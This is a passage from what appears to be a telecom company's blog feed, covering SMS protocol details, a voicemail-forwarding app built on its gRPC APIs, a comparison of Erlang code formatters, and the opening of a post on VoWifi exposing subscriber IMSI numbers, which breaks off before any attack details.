will still need to support both <em>MAP</em> and <em>Diameter</em>.</p><p>Relevant <a href="https://xkcd.com">xkcd</a>:</p><div class="left-right-row"><table class="text"><tr><td>Generation</td><td>2G/3G</td><td>4G</td><td>5G</td></tr><tr><td>Radio technology</td><td>GSM/GPRS</td><td>LTE</td><td>NR</td></tr><tr><td>Protocol group</td><td>SS7</td><td>Diameter</td><td>HTTP2/JSON</td></tr><tr><td></td><td>Node</td><td>Agent</td><td>Function</td></tr><tr><td>Session management</td><td>SGSN</td><td>MME</td><td>AMF</td></tr><tr><td>SM management</td><td>SMSC</td><td>SMSC</td><td>SMSF</td></tr><tr><td>User management</td><td>HLR</td><td>HSS</td><td>UDM</td></tr><tr><td>Device</td><td>MS</td><td>UE</td><td>UE</td></tr></table><a class="image" href="https://xkcd.com/2365/"><img src="https://imgs.xkcd.com/comics/messaging_systems.png"/></a></div><h1>Headache</h1><p>Hopefully you did not get a (too severe) headache by reading this
post.</p><p>I&#x27;ve spared you with <strong>a lot</strong> of details on the lower level of
protocols. There are loads of implementation details that must match
the specifications, otherwise you will get all kinds of aborts and
possibly even dropped traffic.
For instance we learned that we accidentally sent dialogue portions in
more than the first response back, which seemed to work at first
glance; at closer inspection we found out that some messages were
dropped because the length of the packet became larger in size than an
allowed value. We could still send them, but the other side was not
able to receive them.</p><p>Remember: Telco is old and complex. However, it should still function
with different setups and on different hardware, vendors and with
environment.</p><p>Fun-fact: Sometimes a boolean value is not just encoded as a 1
or 0. To save bandwith telco decided that you could also just define
it as a <code>NULL OPTIONAL</code> meaning that if it is defined (but lacks a
value), then it is considered true.  if it is not defined then it is
considered false. This is the case for the <code>moreMessagesToSend</code> flag.</p><p>Hope you enjoy the reading as much as I enjoy digging into these
protocols!</p><p>Special thanks to <em>Stein Eldar</em> and <em>Tobias</em> for giving me feedback
and answering all my stupid questions on this subject, and <em>Atanas</em>
for making me realize there are yet other protocols to carry <em>SMS</em>.
Also <em>Bung</em> for this amazing addition:</p><h4>Addition from <em>Bung</em></h4><p>&quot;I’ve spared you with a lot of details on the lower level of
protocols&quot; needs a lot of emphasis.</p><p>Some funny extra complexities that just came into my mind while
reading:</p><p>The actual <em>SMS</em> text goes into a field called &quot;user data&quot;. There is a
field called &quot;user data length&quot;. When the message is <em>GSM7</em> encoded, the
&quot;user data length&quot; is the number of characters in the text message,
otherwise it&#x27;s the number of bytes in the user data.</p><p>Normally the user data only contains the (encoded) text of the
message, but there is a field called &quot;user data header&quot; which
indicates that there is a length prefixed TLV header in the &quot;user
data&quot;. If the message is <em>GSM7</em> encoded, then the &quot;user data lenght&quot;
field needs to be filled as if the &quot;user data header&quot; was really <em>GSM7</em>
encoded, which it isn&#x27;t.</p><p><em>GSM7</em> is really a variably septet encoding, one character can consist
of either 7 or 14 bits similar to how a <em>UTF-8</em> code point can be 8,
16, 24, or 32 bits. Unlike <em>UTF-8</em> however, there are not multiple
byte ranges corresponding to the different locales (called code pages
in Unicode) but a single 7 bit shift character that says that
following 7 bits should be interpreted as a character from a
translation table which is communicated out of band.</p><p>So all that is only the complexities of a single field (the user data)
for a single encoding (<em>GSM7</em>).</p><p>Then the real kicker: The protocol for <em>SMS</em> is really called <em>SM-TP</em>
(Short Message Transfer Protocol). <em>SM-TP</em> is the same for 2G/3G (on top
of <em>MAP</em>), 4G (on top of <em>SIP</em>), 5G (on top of <em>HTTP</em>). So the very
same stupid &quot;length prefixed TLV encoded headers concatenated with
encoded text with length either in characters or in bytes depending on
encoding and actual meaning of the encoding communicated out of band
but only sometimes&quot; field exists no matter if your talking over old
legacy <em>MAP</em> or the modern <em>HTTP/XML</em> based 5G.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[A new hope for products in telecom]]></title>
            <link>https://www.wgtwo.com/blog/a-new-hope-for-products-in-telecom</link>
            <guid>a-new-hope-for-products-in-telecom</guid>
            <pubDate>Fri, 28 Aug 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.]]></description>
            <content:encoded><![CDATA[<p>This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.</p><p>The prerequisites for a great product is that:</p><ol><li>It is valuable to the user and customer </li><li>It is easy enough to use so that the user can actually realise the value</li><li>It is feasible to build given the restraints you have on technology, legal, etc. </li><li>And on top of that it needs to make sense for your business</li></ol><p>Even if you succeed at all of this, you still have to market, sell and support it. I don’t know anyone - nor have I ever heard about any company - that is able to get this right every time. </p><h2>Remember that one?</h2><p>Even Apple (with Steve Jobs still at the helm) had their flops. Remember “iTunes Ping”? No? Exactly. </p><p>Maybe you’re more into social products, so you bought “Facebook Home”? No I’m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo. </p><p>Well, those products were bold bets. A tech giant launching a smartphone wouldn’t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that&#x27;s right! That one got discontinued just 13 months after launch. </p><h2>Oh the pain!</h2><p>It’s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.</p><p>Operators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. <strong>Why is that?</strong> </p><h2>Learning from failure</h2><p>It’s easy to make fun of big companies that launch products that flop, but we really shouldn’t. Products that flop aren’t a symptom of something that’s wrong. Like Edison put it “I have not failed. I&#x27;ve just found 10,000 ways that won&#x27;t work.” </p><p>Companies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won’t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market. </p><p>They do this by empowering teams to </p><ol><li>Assess new opportunities</li><li>Discover new products</li><li>Build quickly</li><li>Test and learn early</li></ol><p>This is how 10,000 small bets are made. </p><h2>Failing to learn</h2><p>Big traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison’s approach. They never say it out loud but their quote could have been “I have failed, and I’m still clueless whether the other 9,999 ways could have worked”.</p><p>These days though, most big traditional companies have moved away from the “1 big bet approach” and created “digital departments”. </p><p>They hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed. </p><p>Often the teams in these digital departments are empowered to: </p><ol><li>Assess new opportunities</li><li>Discover new products</li></ol><p>But the technology fundamentals are not in place yet, so they are not able to:
3. Build quickly</p><p>Which makes it impossible to:
4. Test and learn early</p><p>This is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix. </p><p>Adding that long wait to what should have been “built quickly” is exactly how they go from many small bets to 1 big bet.</p><h2>Giving up</h2><p>The end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to “get back to basics”, “stick with what they know”, and “strengthen the core business” - meaning that they have entirely given up trying to create new products that people love.</p><p>The customers miss out on great new products, employees leave, and the business suffers. </p><h2>A new hope</h2><p>Our company got started because of this pain. Getting access to a mobile core network to create even small products is hard. </p><p>If you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn’t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it! </p><p>This is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the <a href="http://developer.wgtwo.com/">wgtwo developer portal</a>.</p><p>We believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want. </p><p>The way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy. </p><p>In short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love! </p><h2>Try it out and join us</h2><p>We hope to get your feedback so that we can keep our bets small, and keep learning! </p><p>Want to read about the first product we created, and how you can do the same using the developer portal? Check out my teammate David’s post on <a href="https://wgtwo.com/blog/building-software-for-a-telecom-core-network">Building software for a telecom core network</a>. </p><p>Join us at <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/">TADHack remotely</a> or at one of our locations in <a href="https://tadhack.com/2020/global/tadhack-trondheim-norway/">Trondheim</a> or <a href="https://tadhack.com/2020/global/tadhack-stockholm-sweden/">Stockholm</a> on October 10 and 11. It’s completely free, and you will get to play around with our APIs, meet some cool people, eat, drink and have fun. Hope to see you there!</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Building software for a telecom core network]]></title>
            <link>https://www.wgtwo.com/blog/building-software-for-a-telecom-core-network</link>
            <guid>building-software-for-a-telecom-core-network</guid>
            <pubDate>Fri, 21 Aug 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[One of the goals of wgtwo is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.]]></description>
            <content:encoded><![CDATA[<p>One of the goals of <strong>wgtwo</strong> is to enable operators and third parties to build products and services for the “core network” of the telecom stack. In short, this means providing API access to a subscription’s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.</p><h2>The product</h2><p>One of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.</p><p>Our product idea was simple. When Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.</p><p><img src="/img/blog/building-software-for-a-telecom-core-network/voicebox-splash.png" alt="VoiceBox splash screen"/>
<img src="/img/blog/building-software-for-a-telecom-core-network/voicebox-home.png" alt="VoiceBox home screen"/>
<img src="/img/blog/building-software-for-a-telecom-core-network/message-inbox.png" alt="Android messaging app"/></p><p>The product idea isn’t what most people would call revolutionary, but almost all of the world&#x27;s mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The <strong>wgtwo</strong> core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.</p><h2>Developing on the <strong>wgtwo</strong> platform</h2><p>To create a product on the <strong>wgtwo</strong> platform, the first thing you have to do is create a free developer account at <a href="https://developer.wgtwo.com" target="_blank"><a href="https://developer.wgtwo.com">https://developer.wgtwo.com</a></a>. Once you have signed up, you have to create an Organization and add a Product to that organization.</p><p>You can specify what permissions your product will require in the <code>Product &gt; Scopes</code> tab:</p><p><img src="/img/blog/building-software-for-a-telecom-core-network/developer-portal-scopes.png" alt="Developer Portal Scopes Screen"/></p><p>In an ideal world, VoiceBox would work like this:</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, an event is fired by <strong>wgtwo</strong>’s core network, which VoiceBox receives.</li><li>VoiceBox triggers an SMS/MMS send using our APIs.</li><li>The subscriber receives an SMS/MMS from the sender “VoiceBox”.</li></ol><p>In a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we’re missing the events API and the “Send from Product” API. Currently VoiceBox works like this (changes are highlighted):</p><ol><li>The subscriber signs in and enables the desired functionality in VoiceBox.</li><li>The next time the subscriber receives a voicemail, <strong>VoiceBox will discover it by polling</strong>.</li><li>VoiceBox triggers an MMS send using our APIs.</li><li>The subscriber receives an <strong>MMS from their own number</strong>.</li></ol><p>It’s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber’s consent though, so in the next section we’ll have a look at how that works.</p><h2>Obtaining user consent</h2><p>The app we&#x27;re building is touching sensitive data, and we can&#x27;t do that without asking the subscriber if it’s okay. The <strong>wgtwo</strong> platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.</p><p>When a subscriber opens VoiceBox for the first time, they’re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.</p><p>The login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href="https://vimla.se" target="_blank">Vimla</a>, a Swedish operator which uses our platform):
<img src="/img/blog/building-software-for-a-telecom-core-network/msisdn-screen.png" alt="ID login screen"/>
<img src="/img/blog/building-software-for-a-telecom-core-network/pin-screen.png" alt="ID pin screen"/>
<img src="/img/blog/building-software-for-a-telecom-core-network/consent-screen.png" alt="ID consent screen"/></p><p>Our platform has a standard <a href="https://oauth.net/2/" target="_blank">OAuth 2</a> flow. When the subscriber taps “Accept”, <strong>wgtwo</strong> redirects the subscriber to the third-party, which receives an &quot;access token&quot; that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it’s important to keep it safe.
Next we’ll look at using this access token to perform actions on the subscriber&#x27;s behalf.</p><h2>Connecting to the <strong>wgtwo</strong> API</h2><p>All <strong>wgtwo</strong> APIs are <a href="https://grpc.io/" target="_blank">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don’t have to ever write your own rest adapter for the API.</p><p>Let’s have a look at how you can fetch a Voicemail file:</p><pre><code class="language-kotlin">fun getVoicemail(user: User, uuid: String): Voicemail? {
    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()
    val voicemail = try {
        blockingStub
                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)
                .getVoicemail(getVoicemailRequest)
    } catch (e: StatusRuntimeException) {
        logger.warn(&quot;Error getting voicemail $uuid; ${e.message}&quot;)
        throw e
    }
    if (voicemail.metadata) {
        return Voicemail(
            ... // we map the gRPC voicemail object to a VoiceBox specific object
        )
    } else {
        logger.warn(&quot;No voicemail metadata for $uuid&quot;)
        return null
    }
}
</code></pre><p>We use the official <strong>wgtwo</strong> API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).</p><p>Unlike with REST APIs, we don&#x27;t have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.</p><p>Once we have the voicemail, we send it to the subscriber using their own number as the sender:</p><pre><code class="language-kotlin">fun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {
    val request = MmsProto.SendMessageFromSubscriberRequest
            .newBuilder()
            .addMessageContent(
                MmsProto.MessageContent.newBuilder().setAudio(
                    MmsProto.AudioContent.newBuilder().setWav(audio)
                )
            )
            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender
            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver
            .build()
    val response = blockingStub
            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)
            .sendMessageFromSubscriber(request)
    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {
        true
    } else {
        logger.warn(&quot;Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})&quot;)
        false
    }
} catch (e: Exception) {
    logger.warn(&quot;Unable to send MMS to ${phone.e164}: ${e.message}&quot;)
    false
}
</code></pre><p>This is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we’ll be sending the MMS from the product (“VoiceBox”) instead of the subscriber itself.</p><h2>Conclusion</h2><p>As you can see, we’re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.</p><p>At the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.</p><p>If you’re interested in our platform, please head on over to <a href="https://developer.wgtwo.com" target="_blank"><a href="https://developer.wgtwo.com">https://developer.wgtwo.com</a></a> and create an account. If you have any questions please contact us at <a href="mailto:products@wgtwo.com">products@wgtwo.com</a>.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Choosing an Erlang formatter]]></title>
            <link>https://www.wgtwo.com/blog/choosing-erlang-formatter/</link>
            <guid>choosing-erlang-formatter/</guid>
            <pubDate>Mon, 18 May 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[There are many different Erlang formatters, and as a hack day project]]></description>
            <content:encoded><![CDATA[<p>There are many different Erlang formatters, and as a hack day project
I investigated which options exist for us at <strong>wgtwo</strong>. There
are two main alternatives, but sadly both have problems.  I&#x27;ve also
briefly looked at an Erlang linter.</p><h1>Background</h1><p>In <strong>wgtwo</strong> we use a bunch of different programming
languages, and we all have different experiences and are used to
different languages and environments. We are pretty autonomous and we
are expected to jump in and out in different services to fix bugs and
add features.</p><p>We like when the code is uniform, because it makes it easier to focus
on the business logic. That is why we want to use tools to make sure
our code is consistent no matter who is the author, or which IDE is
used, or in which part of the system the code resides.</p><p>About half a year ago there was a discussion about code style within
<strong>wgtwo</strong> that resulted in formatting tools being applied for
Kotlin, Bazel, Go and Java. It also resulted in an internal wiki page
containing guidelines about code style.</p><p>That document highlights some of the problems with mixing different
code-styles. It should be easy for newcomers to maintain the coding
style. It should also be easy to read diffs, and the discussions about
code style and formatting will be minimized because there is a
concensus.</p><h1>This is nice, I want it for Erlang</h1><p>As some of our services are written in Erlang, I wanted to investigate
which formatters exist for Erlang, and what state they are in. I used
our last hack day for this purpose.</p><p>The requirements I had was that it should be reproducable. Calling the
formatter multiple times should not change the structure more than
once (first time of being called). The formatter should also
preferably work with rebar3 (the most used Erlang build tool).  The
tool should not use external tooling that wouldn&#x27;t work for all
developers flow.</p><p>I also wanted it to have a short execution time, at least after the
initial formatting.</p><h1>Benchmark</h1><p>I searched for formatting tools on hex.pm, github.com, duckduckgo.com,
google.com and came up with the following arbitrary list of Erlang
formatters. There is probably others, but these seems to be the most
used.</p><ul><li>rebar3_fmt</li><li>steamroller</li><li>otp/erl_tidy</li><li>tsloughter/erl_tidy</li><li>rebar3_format</li><li>eryngii</li></ul><h2><a href="https://github.com/fenollp/erlang-formatter">rebar3_fmt</a></h2><p>One big problem with this is that it uses Emacs <code>erlang-mode</code> for
formatting. Sure, I am an Emacs user and the <code>erlang-mode</code> and its
formatting is maintained and supperted by OTP, but my non-Emacs
coworkers would not be happy if they need to install Emacs every time
they want to format the code.</p><h2><a href="https://github.com/old-reliable/steamroller/">steamroller</a></h2><p>Though it was easy to setup (just add it to dependencies in your Rebar
config and run <code>rebar3 steamroll</code>), my first impression of the
execution was that it was really slow. Even when running subsequent
calls on my Dell XPS 13 P82G it took around 3.5 minutes to format.</p><p>The plugin had some support for increasing the number of workers from
the default <code>--J=1</code>, but that did not seem to help with the execution
time.</p><p>The default steamroller formatting options specify 2 spaces instead of
the <code>erlang-mode</code> 4 spaces standard that is used in our code base.</p><p>Here is a sample of a complex record structure</p><pre><code class="language-diff">-                   components =
-                       [{invoke,
-                         #&#x27;Invoke&#x27;{
-                            invokeID = 1,linkedID = asn1_NOVALUE,
-                            operationCode = updateLocation,
-                            parameter =
-                                #&#x27;UpdateLocationArg&#x27;{
-                                   imsi = IMSI,
-                                   &#x27;msc-Number&#x27; = CallingGTBCD,
-                                   &#x27;vlr-Number&#x27; = CallingGTBCD}}}]},
+   components =
+     [
+       {
+         invoke,
+         #&#x27;Invoke&#x27;{
+           invokeID = 1,
+           linkedID = asn1_NOVALUE,
+           operationCode = updateLocation,
+           parameter =
+             #&#x27;UpdateLocationArg&#x27;{
+               imsi = IMSI,
+               &#x27;msc-Number&#x27; = CallingGTBCD,
+               &#x27;vlr-Number&#x27; = CallingGTBCD
+             }
+         }
+       }
+     ]
+ },
</code></pre><p>I was quite happy with the results, even though they were slow, until
I saw how it treated maps</p><pre><code class="language-diff">-      parameters =
-          #{called_party_addr =&gt;
-                #sccp_addr{
-                ... },
-            calling_party_addr =&gt;
-                #sccp_addr{
-                ... },
-            data =&gt;
-                #&#x27;Continue&#x27;{
+         parameters =
+             #{
+                 called_party_addr
+                 =&gt;
+                 #sccp_addr{
+                   ...
+                 },
+                 calling_party_addr
+                 =&gt;
+                 #sccp_addr{
+                   ...
+                 },
+                 data
+                 =&gt;
+                 #&#x27;Continue&#x27;{
</code></pre><p>I can&#x27;t say that I easily understand what the parameters are and which
the values are with this formatting. It burns in my eyes.</p><h2><a href="https://github.com/tsloughter/erl_tidy">erl_tidy</a> and <a href="http://erlang.org/doc/man/erl_tidy.html">erl_tidy</a></h2><p>So I found two <code>erl_tidy</code> projects, one is included in the Erlang/OTP
libraries. The other one seems just to be a rebar3 wrapper around the
first one, so I&#x27;ll just talk about the former one.</p><p>Under the hood this library uses <code>erl_prettypr:format/2</code>, which prints
the abstract syntax tree. This should work well, but gives weird
indentation problems.  For instance when it comes to records it will
not add a newline before the first field, so the lines will become
quite long, and when the lines become close to the paper width of the
document then it inserts too many newlines.</p><p>Visualising with this example again</p><pre><code class="language-diff">-        components =
-            [{invoke,
-              #&#x27;Invoke&#x27;{
-                 invokeID = 1,linkedID = asn1_NOVALUE,
-                 operationCode = updateLocation,
-                 parameter =
-                     #&#x27;UpdateLocationArg&#x27;{
-                        imsi = IMSI,
-                        &#x27;msc-Number&#x27; = CallingGTBCD,
-                        &#x27;vlr-Number&#x27; = CallingGTBCD}}}]},
+     components =
+    [{invoke,
+      #&#x27;Invoke&#x27;{invokeID
+            =
+            1,
+            linkedID
+            =
+            asn1_NOVALUE,
+            operationCode
+            =
+            updateLocation,
+            parameter
+            =
+            #&#x27;UpdateLocationArg&#x27;{imsi
+                         =
+                         IMSI,
+                         &#x27;msc-Number&#x27;
+                         =
+                         CallingGTBCD,
+                         &#x27;vlr-Number&#x27;
+                         =
+                         CallingGTBCD}}}]},
</code></pre><p>There are also some issues with <code>erl_prettypr</code>; it throws an exception
when there are argumented macro functions.</p><pre><code class="language-erlang">-define(MACRO(), object).
foo(?MACRO()) -&gt;
  ok.
</code></pre><pre><code class="language-erlang">** exception exit: no_translation
     in function  io:put_chars/3
        called as io:put_chars(&lt;0.4843.0&gt;,unicode,
                               [...])
     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)
     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)
     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)
     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)
</code></pre><h2><a href="https://github.com/AdRoll/rebar3_format">rebar3_format</a></h2><p>I had an issue when installing this plugin. It was not as easy as
adding <code>rebar3_format</code> to plugins in the rebar3 config. The reason I
had problems with it was that the plugin depends on
<code>inaka/katana_code</code> which for some reason did not get pulled in
properly and was missing some vital files. The issue could be resolved
by deleting the user rebar3 cache (<code>rm -rf ~/.cache/rebar3/</code>) as
explained in <a href="https://github.com/AdRoll/rebar3_format/issues/80">this issue</a></p><p>After installation you need to specify where the source files for
formatting can be found. This would probably not be needed if we did
not use an Erlang umberella project (an umberella project is when
there are subapplications residing in your main application).  Here is
where I found out that the command line option <code>--files
apps/**/{src,include}/*.?rl</code> is apparantly not the same as specifying
<code>{format, [{files, [“apps/**/{src,include}/*.?rl”]}]}</code> in the
config. The command line options finds only one file, while the config
parameter works as expected.</p><p>Formatting-wise it is similar to <code>erl_tidy</code>. This is because it uses
inakas <code>katana_code</code> which in its turn uses <code>erl_tidy</code>.</p><pre><code class="language-diff">-           components =
-               [{invoke,
-                 #&#x27;Invoke&#x27;{
-                    invokeID = 1,linkedID = asn1_NOVALUE,
-                    operationCode = updateLocation,
-                    parameter =
-                        #&#x27;UpdateLocationArg&#x27;{
-                           imsi = IMSI,
-                           &#x27;msc-Number&#x27; = CallingGTBCD,
-                           &#x27;vlr-Number&#x27; = CallingGTBCD}}}]},
+                                      components =
+                                          [{invoke,
+                                            #&#x27;Invoke&#x27;{invokeID = 1,
+                                                      linkedID =
+                                                          asn1_NOVALUE,
+                                                      operationCode =
+                                                          updateLocation,
+                                                      parameter =
+                                                          #&#x27;UpdateLocationArg&#x27;{imsi
+                                                                                   =
+                                                                                   IMSI,
+                                                                               &#x27;msc-Number&#x27;
+                                                                                   =
+                                                                                   CallingGTBCD,
+                                                                               &#x27;vlr-Number&#x27;
+                                                                                   =
+                                                                                   CallingGTBCD}}}]},
</code></pre><p>Problem is that both <code>erl_tidy</code> and <code>katana_code</code> have multiple issues
with macros. It is hard to process format code which include macros
without preprocessing the macros.</p><h2><a href="https://github.com/shiguredo/eryngii">eryngii</a></h2><p>This was a project I found in github. It is written in oCaml, and has
been archived by it&#x27;s owner. I really do not want to install oCaml, so
I just leave it here as a reference.</p><h2><a href="https://github.com/inaka/elvis">elvis</a></h2><p>This is a bonus; it is not a formatter but a linter.</p><p>One difference between formatters and linters are that formatters
change the code into a uniform format, and linters warn or fail when
rules are broken. Linters can also check other things as nesting level.</p><p>This article by Brujo Benavides describe it pretty well.</p><p><a href="https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3">Are formatters better than linters?</a></p><p>Setting it up you need to configure a ruleset and save in a special
Elvis config file in the repo. This config specifies which linting
rules to apply to which files.</p><p>For me it took 8-9 minutes for it to execute linting on our code base
with the example ruleset that is proposed by the tool.</p><h1>Summary</h1><p>Sadly I couldn&#x27;t find any good alternatives that fits our
purposes. There are issues with macros, or execution time.</p><p>I have to put this on the shelf again for a while, with just a dream
of uniform code.</p><h1>Edit: 2020-10-01</h1><p>I forgot to update this blogpost, but something amazing happend.</p><p>After I wrote this blog post I contacted the maintainer of
steamroller, and told him about the slowness I experienced, and some
other difficulties.  One day later he had found and fixed an algorithm
going from an <code>O(n^2)</code> complexity to an <code>O(n)</code>. When retrying it on our
code base, things went from minutes to seconds!</p><p>He also removed and improved some of the ambiguous configuration
parameters.</p><p>I haven&#x27;t yet started to look at the map formatting issues I had, but
maybe that is improved as well. Anyway I&#x27;ll have to leave that for
another hackday.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[VoWifi leaking IMSI]]></title>
            <link>https://www.wgtwo.com/blog/vowifi-imsi-leak/</link>
            <guid>vowifi-imsi-leak/</guid>
            <pubDate>Mon, 30 Mar 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[4G offers more services than the earlier generation such as 3G and 2G. One of]]></description>
            <content:encoded><![CDATA[<p>4G offers more services than the earlier generation such as 3G and 2G. One of
the services has really have gained traction later years is VoLTE (Voice
over LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.</p><p>VoWifi is beneficial in terms being able to use any Wifi connection offering public
internet access thus extending and improving the coverage and connectivity.
Think of it as building our own cellular network, but
using commodity wifi components instead and avoiding the strict regulation and
licensing of spectrum.</p><h2>What is IMSI</h2><p><em>The international mobile subscriber identity (IMSI) is a number that uniquely
identifies every user of a cellular network. It is stored as a 64-bit field
and is sent by the mobile device to the network. It is also used for acquiring
other details of the mobile in the home location register (HLR) or as locally
copied in the visitor location register. To prevent eavesdroppers from
identifying and tracking the subscriber on the radio interface, the IMSI is sent
as rarely as possible and a randomly-generated TMSI is sent instead.</em></p><ul><li><a href="https://en.wikipedia.org/wiki/International_mobile_subscriber_identity">IMSI article</a></li></ul><h3>Security implications</h3><p>The IMSI is a secret identifier stored on the sim and can be exploited in many
ways once known. It is bound to the sim, so changing UE will not help.</p><p>Examples:</p><ul><li>Locating user (UE)</li><li>Intercepting calls</li><li>Intercepting SMS (stealing two factor pin eg.)</li><li>..and more</li></ul><h2>How VoWifi works</h2><p>When your phone is connected to datanetwork and with volte and vowifi enabled
the device (UE) establish sip session directly to packetgateway via 4g, and via
public internet to epdg (evolved packet data gateway) which is in essence a
ipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into
play since epdg is exposed publicly.</p><p>We won&#x27;t go further in depth for volte and vowifi since there are already
excellent articles about the matter:</p><ul><li><a href="https://en.wikipedia.org/wiki/Voice_over_WLAN">Voice over WLAN</a></li><li><a href="https://en.wikipedia.org/wiki/Voice_over_LTE">Voice over LTE</a></li></ul><p><img src="/img/blog/vowifi-imsi-leak/vowifi.jpg" alt="VoWifi topology"/></p><p>To enable VoWifi on your device, please refer to your device manufacturer website:</p><ul><li><a href="https://support.google.com/phoneapp/answer/2811843?hl=en">Android</a></li><li><a href="https://support.apple.com/en-in/HT203032">Apple</a></li></ul><p>Also check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.</p><h2>EPDG exposed on the public internet</h2><p>The Evolved Packet Data Gateway needs to be publicly available on the internet
since UE needs to access it from an arbitrary no-trusted connection. The ipsec
will secure and encrypt both the data and maintain the integrity of the
connection throughout the session.</p><p>The UE finds the epdg termination point by looking dns records partly following
a convention decided by 3gpp and typically looks like this in DNS:</p><pre><code>epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4
epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8
</code></pre><p>From the DNS records we recognize the network operator (MNC) and the
country code (MCC).</p><p>The DNS records are registered under a delegated domain owned by GSMA and
usually are redelegated to operator under their own umbrella, like the example
mnc999.mcc999.pub.3gppnetwork.org.</p><h2>The problem</h2><p>When UE establish session to epdg it uses a vpn, a ipsec relationship using
IKEv2 for authentication, encryption and integrity.</p><p>So far the implementation works as intended and provides good security through
encryption and security.</p><p>The problem is not the VoWifi per see, by rather how ipsec establish the
session. When UE connects to the epdg, it acts as a initiator and the epdg is
